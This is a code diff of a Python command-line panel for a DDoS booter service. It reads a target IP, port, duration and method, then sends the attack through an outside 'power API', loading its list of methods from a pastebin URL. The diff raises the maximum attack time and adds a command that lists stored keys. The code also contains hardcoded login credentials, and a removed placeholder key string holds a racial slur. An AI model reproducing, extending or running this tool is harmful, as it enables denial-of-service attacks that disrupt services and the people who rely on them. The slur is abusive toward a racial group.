@@ -6,11 +6,13 @@ import os
 username = "MrHive17"
 password = "HIVENET7"
 
-max_time = "300s | 5min"
+max_time = "1200s | 5min"
 
-methods_from_api = str("https://pastebin.com/raw/5iBn9TAQ")
-api = str("https://example.com/")
-key = str("niggayourkeygoeshere")
+methods_from_api = str("https://pastebin.com/raw/1zGPiSsJ")
+api = "APILINKGOESHERE" # this is your main power api
+key = "APIKEYGOESHERE"
+user = "root" #if it uses a user/key to send youll need this
+#might add funnel option here
 
 goodbye_banner = str("\nCreated By Furher Acker\n Hope You Enjoyed")
 
@@ -41,17 +43,16 @@ def time_out():
 def attack_menu():
        ip = str(input("IP: "))
        port = str(input("PORT: "))
-       print(f"MAX PRESET ATTACK TIME {max_time}")
-       attk_time = "300"
+       attk_time = str(input("TIME BASED ON WHICH API YOUR USING: "))
        print("LOADING METHODS")
        x = requests.get(methods_from_api)
        print(x.text)
        method = input("METHOD: ")
-       h = requests.get(api+"?key="+key+"&&ip="+ip+"&&port="+port+"&&time="+attk_time+"&&method="+method)
+       h = requests.get(f"{api}?key={key}&host={ip}&port={port}&time={attk_time}&method={method}&username={user}")
        print(f"{h}")
        print(f"ATTACK SENT TO: {ip} ON PORT {port} FOR {attk_time} WITH METHOD {method}")
        print("TIME FOR COOLDOWN BRO SHEESH\(o_o')/")
-       time.sleep(2)
+       time.sleep(4)
        os.system("clear")
        print(banner)
        print(f"COOL DOWN TIME LEFT: 10s")
@@ -74,23 +75,28 @@ def menu():
           while True:
              hiveInput = input(f"root@{username}: ")
              if hiveInput == None:
-                 print("Invalid Command Try ? or help")
+                  print("Invalid Command Try ? or help")
              elif hiveInput == "help":
                  print("methods | shows api methods\nattack | starts attack input")
              elif hiveInput == "attack":
-                 attack_menu()
+                  attack_menu()
              elif hiveInput == "?":
                  print("methods | shows api methods\nattack | starts attack input")
              elif hiveInput == "clear":
-                 os.system("clear")
-                 print(banner)
+                  os.system("clear")
+                  print(banner)
              elif hiveInput == "methods":
-                 t = requests.get(methods_from_api)
-                 print(t.text)
-                 time.sleep(1)
+                  t = requests.get(methods_from_api)
+                  print(t.text)
+                  time.sleep(1)
+             elif hiveInput == "active": #shows key database
+                  f = open("keys", "r")
+                  for x in f:
+                      print(x)
+                  f.close()
              elif hiveInput == "logout":
                  print(goodbye_banner)
-                 time.sleep(2)
+                 time.sleep(1)
                  os.system("clear")
                  sys.exit()
              else:
@@ -103,16 +109,20 @@ def menu():
              menu()
 
 def login():
-    user_input = str(input("USERNAME: "))
-    pass_input = str(input("PASSWORD: "))
+    try:
+        user_input = str(input("USERNAME: "))
+        pass_input = str(input("PASSWORD: "))
 
-    if user_input == username and pass_input == password:
-       print("Logged in")
-       menu()
-    else:
-       print("Lol, no")
-       sys.exit()
-
+        if user_input == username and pass_input == password:
+           print("Logged in")
+           menu()
+        else:
+           print("Lol, no")
+           sys.exit()
+    except KeyboardInterrupt:
+           os.system("clear")
+           time.sleep(1)
+           login()
 def main():
     login()
 main()
